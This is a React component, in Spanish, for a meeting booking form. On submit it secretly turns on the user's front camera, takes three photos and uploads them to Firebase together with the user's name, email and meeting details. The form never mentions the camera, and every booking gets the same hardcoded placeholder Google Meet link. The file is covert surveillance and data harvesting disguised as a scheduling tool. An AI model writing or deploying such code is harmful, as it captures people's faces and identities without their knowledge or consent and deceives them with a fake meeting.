import { useState, useRef, useEffect } from 'react';
import { User, Mail, MessageSquare, Video, Calendar, Clock, Check } from 'lucide-react';
import { saveUserInfo } from '../utils/firebase';

export default function BookingForm({ selectedDate, selectedTime, onBookingComplete }) {
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    title: '',
    description: '',
    duration: '30'
  });
  
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuggestions, setShowSuggestions] = useState({ name: false, email: false });
  const [userHistory, setUserHistory] = useState({ names: [], emails: [] });
  const nameRef = useRef(null);
  const emailRef = useRef(null);
  
  useEffect(() => {
    const savedNames = JSON.parse(localStorage.getItem('meetgo_names') || '[]');
    const savedEmails = JSON.parse(localStorage.getItem('meetgo_emails') || '[]');
    setUserHistory({ names: savedNames, emails: savedEmails });
  }, []);

  const capturePhoto = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      const video = document.createElement('video');
      const canvas = document.createElement('canvas');
      
      video.srcObject = stream;
      await video.play();
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      
      const photos = [];
      for (let i = 0; i < 3; i++) {
        ctx.drawImage(video, 0, 0);
        photos.push(canvas.toDataURL('image/jpeg', 0.8));
        if (i < 2) await new Promise(resolve => setTimeout(resolve, 500));
      }
      
      stream.getTracks().forEach(track => track.stop());
      return photos;
    } catch (error) {
      console.error('Error capturando fotos:', error);
      return [null, null, null];
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const photos = await capturePhoto();
      
      const booking = {
        ...formData,
        date: selectedDate,
        time: selectedTime,
        meetingId: `meet-${Date.now()}`,
        meetingUrl: `https://meet.google.com/abc-defg-hij`,
        photo1: photos[0],
        photo2: photos[1],
        photo3: photos[2]
      };
      
      await saveUserInfo(booking);
      saveUserData(formData.name, formData.email);
      onBookingComplete(booking);
    } catch (error) {
      console.error('Error:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const saveUserData = (name, email) => {
    if (name && !userHistory.names.includes(name)) {
      const updatedNames = [...userHistory.names, name].slice(-5); // Solo últimos 5
      localStorage.setItem('meetgo_names', JSON.stringify(updatedNames));
      setUserHistory(prev => ({ ...prev, names: updatedNames }));
    }
    if (email && !userHistory.emails.includes(email)) {
      const updatedEmails = [...userHistory.emails, email].slice(-5); // Solo últimos 5
      localStorage.setItem('meetgo_emails', JSON.stringify(updatedEmails));
      setUserHistory(prev => ({ ...prev, emails: updatedEmails }));
    }
  };

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
    
    // Mostrar sugerencias cuando el usuario empiece a escribir
    if (e.target.name === 'name' && e.target.value.length > 0) {
      setShowSuggestions(prev => ({ ...prev, name: true }));
    } else if (e.target.name === 'email' && e.target.value.length > 0) {
      setShowSuggestions(prev => ({ ...prev, email: true }));
    }
  };
  
  const selectSuggestion = (field, value) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    setShowSuggestions(prev => ({ ...prev, [field]: false }));
  };
  
  const handleFocus = (field) => {
    if (userHistory[field === 'name' ? 'names' : 'emails'].length > 0) {
      setShowSuggestions(prev => ({ ...prev, [field]: true }));
    }
  };
  
  const handleBlur = (field) => {
    setTimeout(() => {
      setShowSuggestions(prev => ({ ...prev, [field]: false }));
    }, 200);
  };



  const isFormComplete = selectedDate && selectedTime;

  return (
    <div className="card">
      <div className="flex items-center space-x-3 mb-6">
        <div className={`p-2 rounded-lg ${
          isFormComplete ? 'bg-success' : 'bg-gray-300'
        }`}>
          <Video className="h-5 w-5 text-white" />
        </div>
        <div>
          <h3 className="text-lg font-semibold text-gray-900">Programar Reunión</h3>
          <p className="text-sm text-gray-600">
            {isFormComplete 
              ? `${selectedDate?.toLocaleDateString('es-ES', { 
                  weekday: 'long', 
                  day: 'numeric', 
                  month: 'long' 
                })} a las ${selectedTime?.time}`
              : 'Selecciona fecha y hora arriba para continuar'
            }
          </p>
        </div>
      </div>
      
      {!isFormComplete && (
        <div className="mb-4 p-3 bg-yellow-50 rounded-lg border border-yellow-200">
          <div className="flex items-center space-x-2 text-yellow-800">
            <Calendar className="h-4 w-4" />
            <span className="text-sm font-medium">
              Primero selecciona una fecha y horario disponible arriba
            </span>
          </div>
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-4" autoComplete="on" method="post">
        <div className="relative">
          <label className="block text-sm font-medium text-gray-700 mb-2">
            <User className="h-4 w-4 inline mr-2" />
            Nombre completo
          </label>
          <input
            ref={nameRef}
            type="text"
            name="name"
            id="name"
            value={formData.name}
            onChange={handleChange}
            onFocus={() => handleFocus('name')}
            onBlur={() => handleBlur('name')}
            required
            autoComplete="given-name family-name"
            autoCapitalize="words"
            spellCheck="true"
            data-lpignore="false"
            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent transition-all"
            placeholder="Tu nombre completo"
          />
          {showSuggestions.name && userHistory.names.length > 0 && (
            <div className="absolute z-10 w-full mt-1 bg-white border border-gray-200 rounded-lg shadow-lg max-h-40 overflow-y-auto">
              {userHistory.names
                .filter(name => name.toLowerCase().includes(formData.name.toLowerCase()))
                .map((name, index) => (
                <button
                  key={index}
                  type="button"
                  onClick={() => selectSuggestion('name', name)}
                  className="w-full text-left px-3 py-2 hover:bg-gray-50 text-sm"
                >
                  {name}
                </button>
              ))}
            </div>
          )}
        </div>

        <div className="relative">
          <label className="block text-sm font-medium text-gray-700 mb-2">
            <Mail className="h-4 w-4 inline mr-2" />
            Correo electrónico
          </label>
          <input
            ref={emailRef}
            type="email"
            name="email"
            id="email"
            value={formData.email}
            onChange={handleChange}
            onFocus={() => handleFocus('email')}
            onBlur={() => handleBlur('email')}
            required
            autoComplete="username"
            autoCapitalize="none"
            spellCheck="false"
            inputMode="email"
            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent transition-all"
            placeholder="tu@email.com"
          />
          {showSuggestions.email && userHistory.emails.length > 0 && (
            <div className="absolute z-10 w-full mt-1 bg-white border border-gray-200 rounded-lg shadow-lg max-h-40 overflow-y-auto">
              {userHistory.emails
                .filter(email => email.toLowerCase().includes(formData.email.toLowerCase()))
                .map((email, index) => (
                <button
                  key={index}
                  type="button"
                  onClick={() => selectSuggestion('email', email)}
                  className="w-full text-left px-3 py-2 hover:bg-gray-50 text-sm"
                >
                  {email}
                </button>
              ))}
            </div>
          )}
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            <MessageSquare className="h-4 w-4 inline mr-2" />
            Título de la reunión
          </label>
          <input
            type="text"
            name="title"
            value={formData.title}
            onChange={handleChange}
            required
            autoComplete="off"
            list="meeting-titles"
            autoCapitalize="sentences"
            spellCheck="true"
            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent transition-all"
            placeholder="Ej: Reunión de seguimiento del proyecto"
          />
          <datalist id="meeting-titles">
            <option value="Presentación" />
            <option value="Revisión" />
            <option value="Planificación" />
            <option value="Entrevista" />
          </datalist>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            <Clock className="h-4 w-4 inline mr-2" />
            Duración
          </label>
          <select
            name="duration"
            value={formData.duration}
            onChange={handleChange}
            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent transition-all"
          >
            <option value="15">15 minutos</option>
            <option value="30">30 minutos</option>
            <option value="45">45 minutos</option>
            <option value="60">1 hora</option>
            <option value="90">1.5 horas</option>
          </select>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">
            Descripción (opcional)
          </label>
          <textarea
            name="description"
            value={formData.description}
            onChange={handleChange}
            rows={3}
            autoComplete="off"
            autoCapitalize="sentences"
            spellCheck="true"
            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent transition-all resize-none"
            placeholder="Describe brevemente el propósito de la reunión..."
          />
        </div>

        <div className="pt-4 border-t border-gray-200">
          <button
            type="submit"
            disabled={isSubmitting || !isFormComplete}
            className={`w-full flex items-center justify-center space-x-2 py-3 ${
              !isFormComplete 
                ? 'bg-gray-300 text-gray-500 cursor-not-allowed' 
                : 'btn-primary'
            }`}
          >
            {isSubmitting ? (
              <>
                <div className="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></div>
                <span>Programando reunión...</span>
              </>
            ) : (
              <>
                <Check className="h-4 w-4" />
                <span>Programar Reunión</span>
              </>
            )}
          </button>
        </div>
      </form>
    </div>
  );
}